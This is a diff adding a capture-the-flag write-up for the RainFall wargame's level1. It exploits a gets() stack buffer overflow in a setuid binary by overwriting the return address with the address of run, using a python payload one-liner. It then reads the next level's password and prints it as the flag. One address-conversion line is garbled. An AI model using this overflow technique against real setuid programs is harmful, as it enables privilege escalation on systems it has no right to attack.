@@ -1,0 +1,30 @@
+ls -l
+	-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
+
+Program waits for an input
+
+gets function: no buffer overrun check
+
+→ Objective: find segfault limit and write on it the function address we want to call (here : run)
+
+To find run address: objdump -d level1  → 08048444 <run>:
+We must convert it in hexadecimal + little-endian (reverse):
+Addr: 44 84 04 08 -> 2c 54 04 08
+
+We find the offset at 76 char → 75 char nothing happens, 76 Illegal instruction. 
+It can be found by hand testing but also by watching the decompiled code, gets store its result in a char[76]
+
+level1@RainFall:~$ python -c 'print "B"*76+"\x44\x84\x04\x08"' > /tmp/off
+
+Segmentation fault (core dumped)
+level1@RainFall:~$ cat /tmp/off - | ./level1 
+Good... Wait what?
+whoami
+level2
+cd ../level2
+cat .pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+
+→ cat /tmp/off - : allows to read the file and leave it open so that level1 reads it as input
+
+Flag: 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
